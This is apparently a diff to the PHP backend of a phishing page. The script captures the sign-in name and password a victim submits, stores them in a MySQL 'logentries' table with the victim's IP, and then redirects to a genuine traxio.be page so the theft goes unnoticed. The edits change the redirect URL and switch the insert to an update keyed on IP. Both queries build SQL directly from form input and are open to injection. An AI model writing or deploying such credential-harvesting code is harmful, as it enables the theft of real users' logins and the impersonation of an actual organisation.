@@ -9,7 +9,7 @@ $debug = True;
 $conn = new mysqli($servername, $username, $password, $dbname);
 // Check connection
 if ($conn->connect_error) {
-  header("Location: https://www.traxio.be/umbraco/Surface/UmbracoIdentityAccount/LogIn?redirect=%2F");
+  header("Location: https://www.traxio.be/nl/corona/#/");
   die;
 }
 
@@ -33,8 +33,11 @@ $username = $_POST['Sign_in_name'];
 $password = $_POST['Password'];
 
 //Insert to database
-$sql = "INSERT INTO logentries (username, password, ip_address, date)
-VALUES ('$username', '$password', '$ip', now())";
+$sql = "UPDATE logentries
+SET username='$username',
+password = '$password'
+WHERE
+ip='$ip';";
 
 //Print debug info
 if($debug){
@@ -59,6 +62,6 @@ if ($conn->query($sql) === TRUE) {
 $conn->close();
 
 //Redirect to real login page 
-header("Location: https://www.traxio.be/umbraco/Surface/UmbracoIdentityAccount/LogIn?redirect=%2F");
+header("Location: https://www.traxio.be/nl/corona/#/");
 die();
 ?>
